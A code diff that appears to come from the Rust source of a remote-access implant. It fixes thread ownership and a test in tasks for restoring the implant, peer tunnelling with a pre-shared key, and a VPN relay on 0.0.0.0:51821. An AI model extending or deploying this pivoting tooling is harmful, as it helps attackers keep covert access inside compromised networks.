@@ -717,7 +717,7 @@ pub fn run(ctx: &Context, kind: &str, args: &Value) -> Outcome {
                     }
                 }
                 "restore" => match crate::post::restore() {
-                    Ok(()) => Outcome::ok("the implant is itself again\n".into_bytes())
+                    Ok(()) => Outcome::ok("the implant is itself again\n".as_bytes().to_vec())
                         .with("identity", upk::s("")),
                     Err(e) => Outcome::err(1, e),
                 },
@@ -1424,9 +1424,13 @@ fn peer_link(ctx: &Context, args: &Value) -> Outcome {
             } else {
                 crate::config::host_port(&host, port as u16)
             };
+            // The listener thread owns one copy of the address and the
+            // report below needs another: they are two different owners of
+            // the same string, not a redundant clone.
+            let bind_for_thread = bind.clone();
             thread::spawn(move || {
                 if let Err(e) = crate::tunnel::listen_peer(
-                    &bind,
+                    &bind_for_thread,
                     &context.psk,
                     &context.agent_id,
                     context.verbose,
@@ -1754,8 +1758,11 @@ fn start_vpn(ctx: &Context, args: &Value) -> Outcome {
         }
         let listen = args.str_or("listen", "0.0.0.0:51821");
         let context = ctx.clone();
+        // Same as the peer listener above: the thread takes the address it
+        // listens on, the report needs the one the operator asked for.
+        let listen_for_thread = listen.clone();
         thread::spawn(move || {
-            let _ = crate::vpn::relay(&server, &listen, context.verbose);
+            let _ = crate::vpn::relay(&server, &listen_for_thread, context.verbose);
         });
         return Outcome::ok(format!("vpn relay on {listen}\n").into_bytes())
             .with("listen", upk::s(&listen));
@@ -1906,7 +1913,15 @@ mod tests {
 
     #[test]
     fn unknown_kind_is_reported() {
-        let outcome = run("nope", &upk::map(vec![]));
+        let ctx = Context {
+            psk: Vec::new(),
+            agent_id: "test".to_string(),
+            server: String::new(),
+            vpn_addr: String::new(),
+            verbose: false,
+            handover: Vec::new(),
+        };
+        let outcome = run(&ctx, "nope", &upk::map(vec![]));
         assert_eq!(outcome.code, 2);
         assert!(outcome.err.contains("unknown task kind"));
     }
